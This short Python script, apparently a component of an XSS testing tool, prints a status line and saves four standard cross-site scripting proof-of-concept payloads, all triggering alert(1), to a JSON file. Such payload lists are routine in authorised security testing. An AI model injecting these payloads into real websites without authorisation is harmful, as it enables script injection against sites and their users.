import sys, json
print("[AI] Generating XSS payloads...")
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>"
]
with open("xssdominator_results/payloads.json", "w") as f:
    json.dump(payloads, f)
